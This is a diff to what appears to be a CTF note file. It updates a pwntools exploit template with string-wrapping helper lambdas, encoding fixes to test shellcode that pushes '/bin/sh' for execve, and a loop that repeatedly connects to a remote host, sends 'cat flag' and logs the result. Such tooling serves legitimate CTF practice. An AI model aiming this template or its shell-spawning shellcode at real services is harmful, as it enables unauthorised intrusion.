@@ -295,6 +295,25 @@ execve_file = None
 lib_file = None
 
 
+'''
+	使用lambda函数包装pwntools的API，从而使与用户交互的都是str即可
+'''
+ENCODING = 'ISO-8859-1'
+se	= lambda senddata						: r.send(senddata.encode(ENCODING))
+sa	= lambda recvdata, senddata					: r.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
+sl	= lambda senddata						: r.sendline(senddata.encode(ENCODING))
+sla	= lambda recvdata, senddata					: r.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
+re	= lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f			: (r.recv(numb, timeout=timeout).decode(ENCODING))
+ru	= lambda recvdata, timeout=0x3f3f3f3f				: (r.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING))
+uu32	= lambda data							: u32((data.ljust(4, '\x00')).encode(ENCODING), signed="unsigned")
+uu64	= lambda data							: u64((data.ljust(8, '\x00')).encode(ENCODING), signed="unsigned")
+iu32	= lambda data							: u32((data.ljust(4, '\x00')).encode(ENCODING), signed="signed")
+iu64	= lambda data							: u64((data.ljust(8, '\x00')).encode(ENCODING), signed="signed")
+up32	= lambda data							: (p32(data, signed="unsigned").decode(ENCODING))
+up64	= lambda data							: (p64(data, signed="unsigned").decode(ENCODING))
+ip32	= lambda data							: (p32(data, signed="signed").decode(ENCODING))
+ip64	= lambda data							: (p64(data, signed="signed").decode(ENCODING))
+
 
 
 '''
@@ -315,7 +334,7 @@ label1:
 mov	rax, [rsp + %d]	/* 测试内存访问 */
 cmp	rax, 1
 je	label1		/* 测试近跳	*/
-'''%(u64('/bin/sh'.ljust(8, '\x00')), 1))
+'''%(u64('/bin/sh'.ljust(8, '\x00').encode(ENCODING)), 1))
 elif context.arch == 'i386':
 	shellcode = asm('''
 push	%d		/*"/bin"*/
@@ -331,7 +350,7 @@ label1:
 mov	eax, [esp + %d]	/* 测试内存访问 */
 cmp	eax, 1
 je	label1		/* 测试近跳	*/
-'''%(u32('/bin'), u32('/sh\x00'), 1))
+'''%(u32('/bin'.encode(ENCODING)), u32('/sh\x00'.encode(ENCODING)), 1))
 
 
 
@@ -351,7 +370,9 @@ if execve_file != None:
 if lib_file != None:
 	lib = ELF(lib_file)
 
-log.info('-----------------------------------------------------------')
+
+
+
 
 
 '''
@@ -359,7 +380,6 @@ log.info('-----------------------------------------------------------')
 	只有当成功获取shell或者键盘Ctrl+C退出时，程序中止循环
 	否则程序一直进行循环
 '''
-
 
 def exp():
 	global r
@@ -371,27 +391,38 @@ def exp():
 		r = remote(sys.argv[1], sys.argv[2])
 
 	'''
-	u32/u64(number, sign = "signed"/"unsigned", endian = "little"/"big")
-	p32/p64(number, sign = "signed"/"unsigned", endian = "little"/"big")
+	se	= lambda senddata						: r.send(senddata.encode(ENCODING))
+	sa	= lambda recvdata, senddata					: r.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
+	sl	= lambda senddata						: r.sendline(senddata.encode(ENCODING))
+	sla	= lambda recvdata, senddata					: r.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
+	re	= lambda numb = 0x3f3f3f3f, timeout = 0x3f3f3f3f		: ((r.recv(numb), timeout=timeout).decode(ENCODING))
+	ru	= lambda recvdata, timeout = 0x3f3f3f3f				: ((r.recvuntil(recvdata.encode(ENCODING)), timeout=timeout).decode(ENCODING))
+	uu32	= lambda data							: u32((data.ljust(4, '\x00')).encode(ENCODING), signed="unsigned")
+	uu64	= lambda data							: u64((data.ljust(8, '\x00')).encode(ENCODING), signed="unsigned")
+	iu32	= lambda data							: u32((data.ljust(4, '\x00')).encode(ENCODING), signed="signed")
+	iu64	= lambda data							: u64((data.ljust(8, '\x00')).encode(ENCODING), signed="signed")
+	up32	= lambda data							: (p32(data, signed="unsigned").decode(ENCODING))
+	up64	= lambda data							: (p64(data, signed="unsigned").decode(ENCODING))
+	ip32	= lambda data							: (p32(data, signed="signed").decode(ENCODING))
+	ip64	= lambda data							: (p64(data, signed="signed").decode(ENCODING))
 	'''
 
 while True:
 	try:
 		exp()
-		r.sendline('cat flag')
-		data = r.recvuntil('}', timeout = 0.5)
+		sl('cat flag')
+		data = ru('}', 1)
 		if '{' not in data:
 			r.close()
 			continue
 		else:
-			r.interactive()
+			log.info(data)
 			break
 	except KeyboardInterrupt:
 		break
 	except:
 		continue
-log.info('-----------------------------------------------------------')
-  ```
+```
 
 
 ## IDA
